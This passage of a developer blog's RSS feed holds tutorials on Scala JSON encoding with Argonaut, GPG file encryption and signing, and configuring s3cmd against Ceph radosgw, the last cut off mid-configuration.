&lt;p&gt;If you are using &lt;a href=&quot;https://github.com/boot2docker/boot2docker&quot;&gt;boot2docker&lt;/a&gt; on Mac, you need to change the initialization:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;lang-javascript&quot;&gt;&lt;span class=&quot;comment&quot;&gt;// for mac use&lt;/span&gt;
&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; ds = &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; DockerRunner({
    host: &lt;span class=&quot;string&quot;&gt;'http://127.0.0.1'&lt;/span&gt;,
    port: &lt;span class=&quot;number&quot;&gt;4243&lt;/span&gt;
});
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&quot;summary&quot;&gt;Summary&lt;/h2&gt;
&lt;p&gt;With the proposed solution, we are able to use predefined docker images and use custom commands. Now, we can automate every piece.&lt;/p&gt;
&lt;p&gt;Happy hacking.
Chris&lt;/p&gt;
&lt;p&gt;If you have any questions contact me via &lt;a href=&quot;https://twitter.com/chri_hartmann&quot;&gt;Twitter @chri_hartmann&lt;/a&gt; or &lt;a href=&quot;https://github.com/chris-rock&quot;&gt;Github&lt;/a&gt;&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Implicit JSON conversion with Scala</title>
      <link>http://lollyrock.com/articles/scala-implicit-conversion/</link>
      <pubDate>Sat, 20 Sep 2014 19:00:00 -0500</pubDate>
      <guid isPermaLink="true">http://lollyrock.com/articles/scala-implicit-conversion/</guid>
      <author></author>
      <description>&lt;p&gt;In my last blog posts about Scala, I explained &lt;a href=&quot;http://lollyrock.com/articles/scalatra-bearer-authentication/&quot;&gt;Scalatra with Bearer Authentication&lt;/a&gt; and &lt;a href=&quot;http://lollyrock.com/articles/scala-http-requests/&quot;&gt;Asynchronous HTTP requests with Scala and Dispatch&lt;/a&gt;. Today I am going to focus on JSON. We will encode data types to JSON and decode JSON into existing data structures.&lt;/p&gt;
&lt;h2 id=&quot;json-library&quot;&gt;JSON Library&lt;/h2&gt;
&lt;p&gt;&lt;a href=&quot;http://stackoverflow.com/questions/8054018/json-library-for-scala&quot;&gt;Plenty of options&lt;/a&gt; are available for JSON in Scala. It really depends on your setup and may depend on your web framework decision. I am not going to start an argumentation about the best toolkit available. The following post will stick with &lt;a href=&quot;http://argonaut.io&quot;&gt;Argonaut&lt;/a&gt;, but the general approach works with other JSON frameworks as well. I selected it because it fits my function development approach in Scala and works well with &lt;a href=&quot;http://www.scalatra.org/&quot;&gt;Scalatra&lt;/a&gt;. Be aware that Scalatra itself &lt;a href=&quot;http://scalatra.org/2.3/guides/formats/json.html&quot;&gt;promotes&lt;/a&gt; &lt;a href=&quot;http://json4s.org/&quot;&gt;JSON4s&lt;/a&gt; with &lt;a href=&quot;http://jackson.codehaus.org/&quot;&gt;Jackson&lt;/a&gt;, but I found it more difficult to use that Argonaut.&lt;/p&gt;
&lt;h2 id=&quot;conversion&quot;&gt;Conversion&lt;/h2&gt;
&lt;p&gt;Before we talk about the conversion, we need to define the data model. I use the &lt;a href=&quot;http://slick.typesafe.com/doc/2.1.0/orm-to-slick.html&quot;&gt;slick sample structuree&lt;/a&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;lang-scala&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;class&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;Person&lt;/span&gt; (&lt;span class=&quot;params&quot;&gt;id: &lt;span class=&quot;type&quot;&gt;Int&lt;/span&gt;,name: &lt;span class=&quot;type&quot;&gt;String&lt;/span&gt;,age: &lt;span class=&quot;type&quot;&gt;Int&lt;/span&gt;,addressId:&lt;span class=&quot;type&quot;&gt;Int&lt;/span&gt;&lt;/span&gt;)&lt;/span&gt;
  &lt;span class=&quot;keyword&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;class&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;Address&lt;/span&gt; (&lt;span class=&quot;params&quot;&gt;id: &lt;span class=&quot;type&quot;&gt;Int&lt;/span&gt;, street: &lt;span class=&quot;type&quot;&gt;String&lt;/span&gt;,city: &lt;span class=&quot;type&quot;&gt;String&lt;/span&gt;&lt;/span&gt;)&lt;/span&gt;

  &lt;span class=&quot;comment&quot;&gt;// no direct reference, to fit with slick database models&lt;/span&gt;
  &lt;span class=&quot;keyword&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;class&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;PersonWithAddress&lt;/span&gt;(&lt;span class=&quot;params&quot;&gt;person: &lt;span class=&quot;type&quot;&gt;Person&lt;/span&gt;, address: &lt;span class=&quot;type&quot;&gt;Address&lt;/span&gt;&lt;/span&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Now we are able to store a person with address:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;  val person = Person(0, &amp;quot;John Rambo&amp;quot; , 67, 0)
  val address = Address(0, &amp;quot;101 W Main St&amp;quot;, &amp;quot;Madison, Kentucky&amp;quot;)
  val pa = PersonWithAddress(person, address)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;If you are developing REST services you may use JSON as input and output data format. It would be a horror if we have to manually construct the conversion for each route. Therefore we want something like:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;lang-scala&quot;&gt;  &lt;span class=&quot;comment&quot;&gt;// convert the person to json&lt;/span&gt;
  &lt;span class=&quot;keyword&quot;&gt;val&lt;/span&gt; json = pa.asJson
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Scala provides a cool feature for &lt;a href=&quot;http://docs.scala-lang.org/tutorials/FAQ/finding-implicits.html&quot;&gt;implicit type conversion&lt;/a&gt;. This is very handy for our use case and fits with &lt;a href=&quot;http://argonaut.io/doc/codec/&quot;&gt;argonaut codec&lt;/a&gt;. For our case, the following definition is appropriate: &lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;lang-scala&quot;&gt;  &lt;span class=&quot;comment&quot;&gt;// implicit conversion with argonaut&lt;/span&gt;
  &lt;span class=&quot;keyword&quot;&gt;implicit&lt;/span&gt; &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;PersonAddressEncodeJson&lt;/span&gt;&lt;/span&gt;: &lt;span class=&quot;type&quot;&gt;EncodeJson&lt;/span&gt;[&lt;span class=&quot;type&quot;&gt;PersonWithAddress&lt;/span&gt;] =
  &lt;span class=&quot;type&quot;&gt;EncodeJson&lt;/span&gt;((p: &lt;span class=&quot;type&quot;&gt;PersonWithAddress&lt;/span&gt;) =&amp;gt;
    (&lt;span class=&quot;string&quot;&gt;&quot;id&quot;&lt;/span&gt; := p.person.id) -&amp;gt;:
    (&lt;span class=&quot;string&quot;&gt;&quot;name&quot;&lt;/span&gt; := p.person.name) -&amp;gt;:
    (&lt;span class=&quot;string&quot;&gt;&quot;age&quot;&lt;/span&gt; := p.person.age) -&amp;gt;:
    (&lt;span class=&quot;string&quot;&gt;&quot;address&quot;&lt;/span&gt; := &lt;span class=&quot;type&quot;&gt;Json&lt;/span&gt; (
      (&lt;span class=&quot;string&quot;&gt;&quot;id&quot;&lt;/span&gt; := p.address.id),
      (&lt;span class=&quot;string&quot;&gt;&quot;street&quot;&lt;/span&gt; := p.address.street),
      (&lt;span class=&quot;string&quot;&gt;&quot;city&quot;&lt;/span&gt; := p.address.city)
    )
  ) -&amp;gt;: jEmptyObject)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Now we have all pieces together to convert Scala data types to JSON. The result looks as follows:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;lang-json&quot;&gt;{
  &lt;span class=&quot;attr&quot;&gt;&quot;id&quot;&lt;/span&gt;: &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;,
  &lt;span class=&quot;attr&quot;&gt;&quot;name&quot;&lt;/span&gt;: &lt;span class=&quot;string&quot;&gt;&quot;John Rambo&quot;&lt;/span&gt;,
  &lt;span class=&quot;attr&quot;&gt;&quot;age&quot;&lt;/span&gt;: &lt;span class=&quot;number&quot;&gt;67&lt;/span&gt;,
  &lt;span class=&quot;attr&quot;&gt;&quot;address&quot;&lt;/span&gt;: {
    &lt;span class=&quot;attr&quot;&gt;&quot;id&quot;&lt;/span&gt;: &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;,
    &lt;span class=&quot;attr&quot;&gt;&quot;street&quot;&lt;/span&gt;: &lt;span class=&quot;string&quot;&gt;&quot;101 W Main St&quot;&lt;/span&gt;,
    &lt;span class=&quot;attr&quot;&gt;&quot;city&quot;&lt;/span&gt;: &lt;span class=&quot;string&quot;&gt;&quot;Madison, Kentucky&quot;&lt;/span&gt;
  }
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;To consume JSON data we write a decoder:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;lang-scala&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;implicit&lt;/span&gt; &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;PersonAddressDecodeJson&lt;/span&gt;&lt;/span&gt;: &lt;span class=&quot;type&quot;&gt;DecodeJson&lt;/span&gt;[&lt;span class=&quot;type&quot;&gt;PersonWithAddress&lt;/span&gt;] =
  &lt;span class=&quot;type&quot;&gt;DecodeJson&lt;/span&gt;(c =&amp;gt; &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; {

    id &amp;lt;- (c --\ &lt;span class=&quot;string&quot;&gt;&quot;id&quot;&lt;/span&gt;).as[&lt;span class=&quot;type&quot;&gt;Int&lt;/span&gt;]
    name &amp;lt;- (c --\ &lt;span class=&quot;string&quot;&gt;&quot;name&quot;&lt;/span&gt;).as[&lt;span class=&quot;type&quot;&gt;String&lt;/span&gt;]
    age &amp;lt;- (c --\ &lt;span class=&quot;string&quot;&gt;&quot;age&quot;&lt;/span&gt;).as[&lt;span class=&quot;type&quot;&gt;Int&lt;/span&gt;]
    address &amp;lt;- (c --\ &lt;span class=&quot;string&quot;&gt;&quot;address&quot;&lt;/span&gt;).as[&lt;span class=&quot;type&quot;&gt;Json&lt;/span&gt;]

    &lt;span class=&quot;comment&quot;&gt;// extract data from address&lt;/span&gt;
    addressid &amp;lt;- (address.acursor --\ &lt;span class=&quot;string&quot;&gt;&quot;id&quot;&lt;/span&gt;).as[&lt;span class=&quot;type&quot;&gt;Int&lt;/span&gt;]
    street &amp;lt;- (address.acursor --\ &lt;span class=&quot;string&quot;&gt;&quot;street&quot;&lt;/span&gt;).as[&lt;span class=&quot;type&quot;&gt;String&lt;/span&gt;]
    city &amp;lt;- (address.acursor --\ &lt;span class=&quot;string&quot;&gt;&quot;city&quot;&lt;/span&gt;).as[&lt;span class=&quot;type&quot;&gt;String&lt;/span&gt;]

  } &lt;span class=&quot;keyword&quot;&gt;yield&lt;/span&gt; &lt;span class=&quot;type&quot;&gt;PersonWithAddress&lt;/span&gt;(&lt;span class=&quot;type&quot;&gt;Person&lt;/span&gt;(id, name, age, addressid), &lt;span class=&quot;type&quot;&gt;Address&lt;/span&gt;(addressid, street, city)))
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;As a result we get a valid Scala object with the expected data&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;lang-code&quot;&gt;PersonWithAddress(Person(0,John Rambo,67,0),Address(0,101 W Main St,Madison, Kentucky))
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Compared to Nodejs, this decode is also a type validation. The conversion will fail, if one parameter is missing. In case you would like to make parts optional, you need to adapt the case class and use &lt;code&gt;Option[Int]&lt;/code&gt; instead of &lt;code&gt;Int&lt;/code&gt;. Additionally you need to adapt the decode and parse to &lt;code&gt;Option[Int]&lt;/code&gt;:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;lang-code&quot;&gt;  age &amp;lt;- (c --\ &amp;quot;age&amp;quot;).as[Option[Int]]
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&quot;the-complete-sample-&quot;&gt;The complete sample:&lt;/h1&gt;
&lt;pre&gt;&lt;code class=&quot;lang-scala&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; argonaut._, &lt;span class=&quot;type&quot;&gt;Argonaut&lt;/span&gt;._

&lt;span class=&quot;class&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;object&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;ImplicitConversion&lt;/span&gt; &lt;/span&gt;{

  &lt;span class=&quot;comment&quot;&gt;// data model based on http://slick.typesafe.com/doc/2.1.0/orm-to-slick.html&lt;/span&gt;
  &lt;span class=&quot;keyword&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;class&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;Person&lt;/span&gt; (&lt;span class=&quot;params&quot;&gt;id: &lt;span class=&quot;type&quot;&gt;Int&lt;/span&gt;,name: &lt;span class=&quot;type&quot;&gt;String&lt;/span&gt;,age: &lt;span class=&quot;type&quot;&gt;Int&lt;/span&gt;,addressId:&lt;span class=&quot;type&quot;&gt;Int&lt;/span&gt;&lt;/span&gt;)&lt;/span&gt;
  &lt;span class=&quot;keyword&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;class&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;Address&lt;/span&gt; (&lt;span class=&quot;params&quot;&gt;id: &lt;span class=&quot;type&quot;&gt;Int&lt;/span&gt;, street: &lt;span class=&quot;type&quot;&gt;String&lt;/span&gt;,city: &lt;span class=&quot;type&quot;&gt;String&lt;/span&gt;&lt;/span&gt;)&lt;/span&gt;

  &lt;span class=&quot;comment&quot;&gt;// no direct reference, to fit with slick database models&lt;/span&gt;
  &lt;span class=&quot;keyword&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;class&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;PersonWithAddress&lt;/span&gt;(&lt;span class=&quot;params&quot;&gt;person: &lt;span class=&quot;type&quot;&gt;Person&lt;/span&gt;, address: &lt;span class=&quot;type&quot;&gt;Address&lt;/span&gt;&lt;/span&gt;)&lt;/span&gt;

  &lt;span class=&quot;comment&quot;&gt;// implicit conversion with argonaut&lt;/span&gt;
  &lt;span class=&quot;keyword&quot;&gt;implicit&lt;/span&gt; &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;PersonAddressEncodeJson&lt;/span&gt;&lt;/span&gt;: &lt;span class=&quot;type&quot;&gt;EncodeJson&lt;/span&gt;[&lt;span class=&quot;type&quot;&gt;PersonWithAddress&lt;/span&gt;] =
  &lt;span class=&quot;type&quot;&gt;EncodeJson&lt;/span&gt;((p: &lt;span class=&quot;type&quot;&gt;PersonWithAddress&lt;/span&gt;) =&amp;gt;
    (&lt;span class=&quot;string&quot;&gt;&quot;id&quot;&lt;/span&gt; := p.person.id) -&amp;gt;:
    (&lt;span class=&quot;string&quot;&gt;&quot;name&quot;&lt;/span&gt; := p.person.name) -&amp;gt;:
    (&lt;span class=&quot;string&quot;&gt;&quot;age&quot;&lt;/span&gt; := p.person.age) -&amp;gt;:
    (&lt;span class=&quot;string&quot;&gt;&quot;address&quot;&lt;/span&gt; := &lt;span class=&quot;type&quot;&gt;Json&lt;/span&gt; (
      (&lt;span class=&quot;string&quot;&gt;&quot;id&quot;&lt;/span&gt; := p.address.id),
      (&lt;span class=&quot;string&quot;&gt;&quot;street&quot;&lt;/span&gt; := p.address.street),
      (&lt;span class=&quot;string&quot;&gt;&quot;city&quot;&lt;/span&gt; := p.address.city)
    )
  ) -&amp;gt;: jEmptyObject)

  &lt;span class=&quot;keyword&quot;&gt;implicit&lt;/span&gt; &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;PersonAddressDecodeJson&lt;/span&gt;&lt;/span&gt;: &lt;span class=&quot;type&quot;&gt;DecodeJson&lt;/span&gt;[&lt;span class=&quot;type&quot;&gt;PersonWithAddress&lt;/span&gt;] =
  &lt;span class=&quot;type&quot;&gt;DecodeJson&lt;/span&gt;(c =&amp;gt; &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; {

    id &amp;lt;- (c --\ &lt;span class=&quot;string&quot;&gt;&quot;id&quot;&lt;/span&gt;).as[&lt;span class=&quot;type&quot;&gt;Int&lt;/span&gt;]
    name &amp;lt;- (c --\ &lt;span class=&quot;string&quot;&gt;&quot;name&quot;&lt;/span&gt;).as[&lt;span class=&quot;type&quot;&gt;String&lt;/span&gt;]
    age &amp;lt;- (c --\ &lt;span class=&quot;string&quot;&gt;&quot;age&quot;&lt;/span&gt;).as[&lt;span class=&quot;type&quot;&gt;Int&lt;/span&gt;]
    address &amp;lt;- (c --\ &lt;span class=&quot;string&quot;&gt;&quot;address&quot;&lt;/span&gt;).as[&lt;span class=&quot;type&quot;&gt;Json&lt;/span&gt;]

    &lt;span class=&quot;comment&quot;&gt;// extract data from address&lt;/span&gt;
    addressid &amp;lt;- (address.acursor --\ &lt;span class=&quot;string&quot;&gt;&quot;id&quot;&lt;/span&gt;).as[&lt;span class=&quot;type&quot;&gt;Int&lt;/span&gt;]
    street &amp;lt;- (address.acursor --\ &lt;span class=&quot;string&quot;&gt;&quot;street&quot;&lt;/span&gt;).as[&lt;span class=&quot;type&quot;&gt;String&lt;/span&gt;]
    city &amp;lt;- (address.acursor --\ &lt;span class=&quot;string&quot;&gt;&quot;city&quot;&lt;/span&gt;).as[&lt;span class=&quot;type&quot;&gt;String&lt;/span&gt;]

  } &lt;span class=&quot;keyword&quot;&gt;yield&lt;/span&gt; &lt;span class=&quot;type&quot;&gt;PersonWithAddress&lt;/span&gt;(&lt;span class=&quot;type&quot;&gt;Person&lt;/span&gt;(id, name, age, addressid), &lt;span class=&quot;type&quot;&gt;Address&lt;/span&gt;(addressid, street, city)))

  &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;main&lt;/span&gt;&lt;/span&gt;(args: &lt;span class=&quot;type&quot;&gt;Array&lt;/span&gt;[&lt;span class=&quot;type&quot;&gt;String&lt;/span&gt;]) {
    &lt;span class=&quot;comment&quot;&gt;// running a sample&lt;/span&gt;
    &lt;span class=&quot;keyword&quot;&gt;val&lt;/span&gt; person = &lt;span class=&quot;type&quot;&gt;Person&lt;/span&gt;(&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&quot;John Rambo&quot;&lt;/span&gt; , &lt;span class=&quot;number&quot;&gt;67&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;)
    &lt;span class=&quot;keyword&quot;&gt;val&lt;/span&gt; address = &lt;span class=&quot;type&quot;&gt;Address&lt;/span&gt;(&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&quot;101 W Main St&quot;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&quot;Madison, Kentucky&quot;&lt;/span&gt;)
    &lt;span class=&quot;keyword&quot;&gt;val&lt;/span&gt; pa = &lt;span class=&quot;type&quot;&gt;PersonWithAddress&lt;/span&gt;(person, address)

    &lt;span class=&quot;comment&quot;&gt;// convert the person to json&lt;/span&gt;
    &lt;span class=&quot;keyword&quot;&gt;val&lt;/span&gt; json = pa.asJson
    &lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; content = json.toString()

    println (content)

    &lt;span class=&quot;comment&quot;&gt;// we should get a person instance here&lt;/span&gt;
    &lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; padecoded : &lt;span class=&quot;type&quot;&gt;PersonWithAddress&lt;/span&gt; = content.decodeOption[&lt;span class=&quot;type&quot;&gt;PersonWithAddress&lt;/span&gt;].get

    println (padecoded)
  }
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h2&gt;
&lt;p&gt;With a few lines of code, we encapsulate the complete JSON encoding and decoding. Its amazing how easy it is. It may not be as intuitive as in Nodejs, but comes with additional type checks, which is generally more complex in Nodejs.&lt;/p&gt;
&lt;p&gt;If you have any questions contact me via &lt;a href=&quot;https://twitter.com/chri_hartmann&quot;&gt;Twitter @chri_hartmann&lt;/a&gt; or &lt;a href=&quot;https://github.com/chris-rock&quot;&gt;Github&lt;/a&gt;&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Encrypt files with GPG</title>
      <link>http://lollyrock.com/articles/encrypt-files-with-gpg/</link>
      <pubDate>Sat, 13 Sep 2014 19:00:00 -0500</pubDate>
      <guid isPermaLink="true">http://lollyrock.com/articles/encrypt-files-with-gpg/</guid>
      <author></author>
      <description>&lt;p&gt;Although &lt;a href=&quot;https://www.gnupg.org/&quot;&gt;GPG&lt;/a&gt; and &lt;a href=&quot;https://gpgtools.org/&quot;&gt;GPG Tools&lt;/a&gt; are well known for Email encryption, the same tool-chain can be used to encrypt files. We deep dive into the command line, but everything should work with any other UI client as well.&lt;/p&gt;
&lt;h2 id=&quot;password-encryption-with-aes&quot;&gt;Password encryption with AES&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;# encrypt file
gpg --cipher-algo AES256 -c test.txt
# decrypt file
gpg -d test.txt.gpg
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&quot;enforce-message-integrity-check&quot;&gt;Enforce message integrity check&lt;/h2&gt;
&lt;p&gt;Although default with AES, it makes sense to force the message integrity check and can be useful if you switch to other ciphers. Especially if you receive a message like &lt;/p&gt;
&lt;pre&gt;&lt;code&gt;gpg: WARNING: message was not integrity protected
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;you should enable the integrity check. The full encryption and decryption works as before:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;gpg --cipher-algo AES256 --force-mdc -c test.txt
gpg -d test.txt.gpg
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&quot;sign-files&quot;&gt;Sign files&lt;/h2&gt;
&lt;p&gt;Since you are using the same keychain for signing and encrypting as for your emails, its very easy to sign a message. Be aware that signed messages are not encrypted.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;# encrypt and sign message, you will be prompted for your password if required
$ gpg --sign test.txt
# if you have multiple accounts, you may select it with the -u parameter
$ gpg -u ABBFDCA9 --sign test.txt

You need a passphrase to unlock the secret key for
user: &amp;quot;Christoph Hartmann &amp;lt;chris@lollyrock.com&amp;gt;&amp;quot;
4096-bit RSA key, ID ABBFDCA9, created 2014-04-29

# you can verify which person encrypted the
$ gpg --verify test.txt.gpg
gpg: Signature made So 14 Sep 22:28:04 2014 CEST using RSA key ID ABBFDCA9
gpg: Good signature from &amp;quot;Christoph Hartmann &amp;lt;chris@lollyrock.com&amp;gt;&amp;quot;
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&quot;encrypt-files-for-specific-persons&quot;&gt;Encrypt files for specific persons&lt;/h2&gt;
&lt;p&gt;Now we are going to encrypt files for &lt;code&gt;john@example.com&lt;/code&gt; by using his public key. &lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ gpg --cipher-algo AES256 -e --sign --recipient john@example.com test.txt
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;With this approach we are able to store files in any cloud storage. Only the recipient is able to decrypt the content. In this specific case only John is able to decrypt the content with his private key. We do not have to ship any shared password to John and everything works out of the box. By reusing the GPG infrastructure, sharing encrypted content is much simpler. &lt;/p&gt;
&lt;p&gt;If you are not using GPG/PGP already for your email, please do.&lt;/p&gt;
&lt;p&gt;Cheers
Chris&lt;/p&gt;
&lt;p&gt;If you have any questions contact me via &lt;a href=&quot;https://twitter.com/chri_hartmann&quot;&gt;Twitter @chri_hartmann&lt;/a&gt; or &lt;a href=&quot;https://github.com/chris-rock&quot;&gt;Github&lt;/a&gt;&lt;/p&gt;
</description>
    </item>
    <item>
      <title>s3cmd with radosgw</title>
      <link>http://lollyrock.com/articles/s3cmd-with-radosgw/</link>
      <pubDate>Sat, 06 Sep 2014 19:00:00 -0500</pubDate>
      <guid isPermaLink="true">http://lollyrock.com/articles/s3cmd-with-radosgw/</guid>
      <author></author>
      <description>&lt;p&gt;Amazon introduced the concept of &lt;a href=&quot;http://en.wikipedia.org/wiki/Amazon_S3&quot;&gt;S3&lt;/a&gt; object storage to a wide-range of users. Their interface is the defacto-standard to store files in web applications. Nowadays, it is used by other vendors as well. &lt;a href=&quot;http://ceph.com/&quot;&gt;Ceph&lt;/a&gt; and &lt;a href=&quot;http://basho.com/riak-cloud-storage/&quot;&gt;RiakCS&lt;/a&gt; are some examples, where the same interface is available. This blog post will setup s3cmd with Ceph radosgw.&lt;/p&gt;
&lt;h2 id=&quot;about-s3&quot;&gt;About S3&lt;/h2&gt;
&lt;p&gt;It is used as an interface for distributed storage due to the fact that the only thing you need to put and retrieve files is http. It is very handy to have a clear interface to manage files across different machines. For example you may want to backup your local files to a s3 cluster. This requires a toolset that enables you to easily store and retrieve s3 files from command line. &lt;a href=&quot;http://s3tools.org/s3cmd&quot;&gt;s3cmd&lt;/a&gt; is a great tool for just that. Out of the box it works with Amazon S3, but can be easily configured with &lt;a href=&quot;http://ceph.com/docs/master/man/8/radosgw/&quot;&gt;radosgw&lt;/a&gt;, which is commonly used in conjunction with &lt;a href=&quot;http://www.openstack.org/&quot;&gt;OpenStack&lt;/a&gt;.&lt;/p&gt;
&lt;h2 id=&quot;installation&quot;&gt;Installation&lt;/h2&gt;
&lt;p&gt;Before we start implementing the base set, you need to install &lt;code&gt;s3cmd&lt;/code&gt; on you machine. &lt;/p&gt;
&lt;h3 id=&quot;ubuntu&quot;&gt;Ubuntu&lt;/h3&gt;
&lt;p&gt;For Ubuntu you need to install the s3 repo before installing the package &lt;code&gt;s3cmd&lt;/code&gt;:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;lang-bash&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# install repo key&lt;/span&gt;
wget -O- -q http://s3tools.org/repo/deb-all/stable/s3tools.key | sudo apt-key add -
&lt;span class=&quot;comment&quot;&gt;# install repo&lt;/span&gt;
sudo wget -O/etc/apt/sources.list.d/s3tools.list http://s3tools.org/repo/deb-all/stable/s3tools.list
&lt;span class=&quot;comment&quot;&gt;# update package manager&lt;/span&gt;
sudo apt-get update
&lt;span class=&quot;comment&quot;&gt;# install s3cmd&lt;/span&gt;
sudo apt-get install s3cmd
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&quot;macos&quot;&gt;MacOS&lt;/h3&gt;
&lt;p&gt;On Mac you may use &lt;a href=&quot;http://brew.sh/&quot;&gt;brew&lt;/a&gt; to install s3cmd:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;# install s3cmd
brew install s3cmd
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&quot;basic-commands&quot;&gt;Basic Commands&lt;/h2&gt;
&lt;p&gt;S3 uses a different terminology, compared to posix filesystems:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;bucket: kind of directory&lt;/li&gt;
&lt;li&gt;object: similar to a file&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Although Amazon S3 allows you to create a &lt;code&gt;directory&lt;/code&gt; within a bucket, it will not be a real directory. In S3, a directory is more like a file prefix. Take this in consideration when you upload huge amounts of data.&lt;/p&gt;
&lt;p&gt;In general it is very efficient to use prefixes for searches instead of postfixes. E.g. if you look for file types, you may store your files as &lt;code&gt;txt.file&lt;/code&gt; instead of &lt;code&gt;file.txt&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Basic commands for &lt;code&gt;s3cmd&lt;/code&gt; are:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;lang-bash&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# S3cmd help&lt;/span&gt;
s3cmd --help

&lt;span class=&quot;comment&quot;&gt;# Display all buckets&lt;/span&gt;
s3cmd ls

&lt;span class=&quot;comment&quot;&gt;# Create new bucket&lt;/span&gt;
s3cmd mb s3://YOURBUCKET

&lt;span class=&quot;comment&quot;&gt;# Upload new file&lt;/span&gt;
s3cmd put test.txt s3://YOURBUCKET

&lt;span class=&quot;comment&quot;&gt;# Download file&lt;/span&gt;
s3cmd get s3://YOURBUCKET/test.txt test.txt
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&quot;configuration-for-radosgw&quot;&gt;Configuration for radosgw&lt;/h2&gt;
&lt;p&gt;Since &lt;code&gt;s3cmd&lt;/code&gt; is optimized for Amazon S3, you need to apply a few changes to convince &lt;code&gt;s3cmd&lt;/code&gt; to talk with &lt;code&gt;radosgw&lt;/code&gt;. At first we create a new configuration with s3cmd via interactive mode:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;lang-code&quot;&gt;s3cmd --configure -c s3test.cfg

Enter new values or accept defaults in brackets with Enter.
Refer to user manual for detailed description of all options.

Access key and Secret key are your identifiers for Amazon S3
Access Key: key
Secret Key: secret

Encryption password is used to protect your files from reading
by unauthorized persons while in transfer to S3
Encryption password: 
Path to GPG program [/usr/local/bin/gpg]: 

